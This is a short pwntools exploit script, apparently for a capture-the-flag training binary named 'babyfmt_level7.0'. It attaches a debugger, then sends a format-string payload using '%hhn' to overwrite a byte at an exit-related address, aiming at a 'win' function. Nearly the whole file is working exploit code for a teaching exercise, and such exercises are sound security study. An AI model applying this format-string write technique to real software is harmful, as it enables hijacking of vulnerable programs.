from pwn import * 

binary = './babyfmt_level7.0'

p = process(binary)

s = '''
b * printf
b * main+264
'''



gdb.attach(p, s)

# 0x   c8c5   6078  8cd2  5937

win = 0x00401540

exit = 0x404080


payload = flat(
	"%65c%30$hhn---",
	p64(exit)
)
p.sendline(payload)





p.interactive()
